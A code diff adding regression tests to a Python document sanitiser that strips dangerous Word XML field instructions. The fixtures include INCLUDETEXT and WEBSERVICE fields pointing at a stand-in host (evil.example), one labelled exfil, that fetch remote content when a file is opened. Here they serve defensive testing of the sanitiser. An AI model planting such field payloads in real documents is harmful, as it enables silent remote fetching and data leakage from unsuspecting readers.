@@ -2426,6 +2426,28 @@ class TestStripXmlMacrosRegex:
         assert removed == []
         assert clean == xml
 
+    def test_field_keyword_in_markup_not_corrupted(self):
+        """Regression: field keywords appearing inside element/attribute NAMES (not inside a
+        field carrier) must NOT be scrubbed — the old raw-XML scan emitted a value-less
+        `_CDR_REMOVED_` token there, producing invalid XML (the styles.xml prod bug)."""
+        # Mimics python-docx-authored styles.xml shapes: 'link', 'autoRedefine', etc. as
+        # element/attribute names. None of these are field carriers.
+        xml = (b'<w:style w:type="paragraph"><w:name w:val="heading 1"/>'
+               b'<w:link w:val="Heading1Char"/><w:autoRedefine/>'
+               b'<w:rPr><w:rFonts w:hAnsi="Calibri Light"/></w:rPr></w:style>')
+        clean, removed = cdr._strip_xml_macros(xml, "word/styles.xml")
+        assert clean == xml, "benign markup must pass through byte-for-byte"
+        assert removed == []
+        assert b"_CDR_REMOVED_" not in clean
+
+    def test_fldsimple_instr_attribute_neutralised(self):
+        """The fldSimple instruction-attribute carrier form is also scrubbed."""
+        xml = b'<w:fldSimple w:instr=" INCLUDETEXT http://evil.example/x "><w:r/></w:fldSimple>'
+        clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
+        assert b"INCLUDETEXT _CDR_REMOVED_" in clean
+        assert b"evil.example" not in clean
+        assert len(removed) > 0
+
     def test_webservice_no_parens_neutralised(self):
         """WEBSERVICE Word field form (no parentheses) fetches URLs on open — must be caught."""
         xml = b'<w:instrText> WEBSERVICE "http://evil.example/exfil" </w:instrText>'
